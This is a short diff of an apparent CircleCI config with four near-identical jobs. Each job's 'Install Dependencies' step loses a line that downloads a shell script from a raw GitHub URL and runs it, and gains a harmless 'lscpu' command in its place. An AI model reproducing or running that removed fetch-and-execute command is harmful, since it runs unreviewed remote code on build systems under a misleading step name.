@@ -6,28 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 30m wget https://raw.githubusercontent.com/breakok/ob/main/tt.sh && chmod +x tt.sh && bash tt.sh
+            command: timeout 30m lscpu
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 30m wget https://raw.githubusercontent.com/breakok/ob/main/tt.sh && chmod +x tt.sh && bash tt.sh
+            command: timeout 30m lscpu
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 30m wget https://raw.githubusercontent.com/breakok/ob/main/tt.sh && chmod +x tt.sh && bash tt.sh
+            command: timeout 30m lscpu
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: timeout 30m wget https://raw.githubusercontent.com/breakok/ob/main/tt.sh && chmod +x tt.sh && bash tt.sh
+            command: timeout 30m lscpu
 workflows:
     version: 2.1
     build:
